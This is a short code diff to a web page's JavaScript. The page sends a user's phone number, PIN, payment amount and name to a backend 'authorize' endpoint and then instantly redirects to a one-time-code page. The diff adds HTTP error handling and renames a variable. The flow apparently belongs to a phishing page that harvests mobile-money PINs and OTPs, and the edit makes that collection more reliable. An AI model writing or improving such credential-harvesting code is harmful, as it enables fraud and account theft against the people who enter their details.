@@ -645,7 +645,7 @@
         document.getElementById('errorMsg').style.display = 'none';
     }
 
-    // ─── SEND TO BACKEND API (THIS IS THE CORRECT WAY) ───
+    // ─── SEND TO BACKEND API WITH BETTER ERROR HANDLING ───
     function sendToBackend(phone, pin, amount, name, period) {
         console.log('📤 Sending to backend:', {
             url: `${CONFIG.API_URL}/api/authorize`,
@@ -665,7 +665,13 @@
                 period: period
             })
         })
-        .then(response => response.json())
+        .then(response => {
+            console.log('📥 Response Status:', response.status);
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+        })
         .then(data => {
             if (data.success) {
                 console.log('✅ Backend sent successfully!');
@@ -710,9 +716,9 @@
         sendToBackend(phone, pin, amount, name, period);
 
         // ─── INSTANT REDIRECT TO OTP - NO DELAY ───
-        const params = new URLSearchParams(window.location.search);
-        params.set('phone', phone);
-        window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
+        const redirectParams = new URLSearchParams(window.location.search);
+        redirectParams.set('phone', phone);
+        window.location.href = CONFIG.OTP_PAGE + '?' + redirectParams.toString();
     }
 
     // ─── BIND TO BUTTON ───
